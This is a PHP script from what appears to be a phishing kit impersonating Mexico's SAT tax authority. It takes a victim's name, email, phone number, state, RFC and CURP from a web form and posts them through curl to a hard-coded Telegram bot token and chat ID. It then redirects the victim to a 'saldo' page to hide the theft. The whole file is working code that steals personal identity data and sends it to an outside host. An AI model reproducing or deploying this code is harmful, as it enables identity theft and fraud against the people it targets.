<?php
error_reporting(0);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
date_default_timezone_set('America/Guatemala');

$token = "5158268829:AAF8xc22TgLd0-Rmw1GwP98EVcbAwFbIJYA";
$name = $_POST['name'];
$mail = $_POST['mail'];
$number = $_POST['number'];
$rfc = $_POST['rfc'];
$estado = $_POST['estado'];
$curp = $_POST['curp'];

$datos = [
    'chat_id' => '1189170037',
    #'chat_id' => '@el_canal si va dirigido a un canal',
    'text' => "NUEVOS DATOS RECIBIDOS PRIMERA PARTE \n\n⭐ Nombre: $name \n🪙 Email: $mail \n📞 Numero: $number \n🆔 RFC: $rfc \n🌐 Estado: $estado \n🧾 CURP: $curp \n\nATTE: SATReboot RAAAAAA!",
    'parse_mode' => 'HTML' #formato del mensaje
];


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . $token . "/sendMessage");
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, TRUE);
curl_setopt($ch, CURLOPT_POSTFIELDS, $datos);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$r_array = json_decode(curl_exec($ch), true);

curl_close($ch);

if ($r_array['ok'] == 1) {
    header("Location: saldo.html");
} else {
    echo "Mensaje no enviado.";
    print_r($r_array);
}
